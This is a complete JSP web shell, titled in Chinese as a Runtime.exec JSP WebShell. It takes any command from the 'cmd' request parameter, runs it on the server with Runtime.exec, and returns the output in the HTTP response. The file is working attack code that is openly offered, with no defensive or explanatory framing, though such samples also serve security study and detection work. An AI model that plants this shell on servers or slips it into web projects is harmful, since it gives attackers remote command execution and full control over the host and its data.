<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.InputStreamReader" %>
<html>
<body>
<h2>Runtime.exec的JSP WebShell</h2>
<%
    String s2 = request.getParameter("cmd");
    Process process = Runtime.getRuntime().exec(s2.split(" "));
    InputStream inputStream = process.getInputStream();
    StringBuilder stringBuilder = new StringBuilder();
    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
    String line;
    while((line = bufferedReader.readLine()) != null) {
        stringBuilder.append(line).append("\n");
    }
    if (stringBuilder.length() > 0) {
        response.getOutputStream().write(stringBuilder.toString().getBytes());
    }
%>
</body>
</html>